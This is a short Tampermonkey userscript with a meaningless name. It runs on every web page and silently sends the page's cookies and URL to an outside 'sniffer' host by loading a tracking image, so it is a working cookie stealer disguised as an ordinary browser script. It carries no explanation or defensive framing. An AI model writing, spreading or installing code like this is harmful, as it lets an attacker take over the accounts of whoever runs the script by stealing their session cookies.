// ==UserScript==
// @name         s
// @namespace    http://tampermonkey.net/
// @version      0.1
// @author       POCCOMAXA
// @match        http*://*/*
// @downloadURL  http://newoin.github.io/s.user.js
// @grant        none
// ==/UserScript==

var img=new Image();img.src="https://sniffer-newoin.c9users.io/"+document.cookie+ " " + document.location;
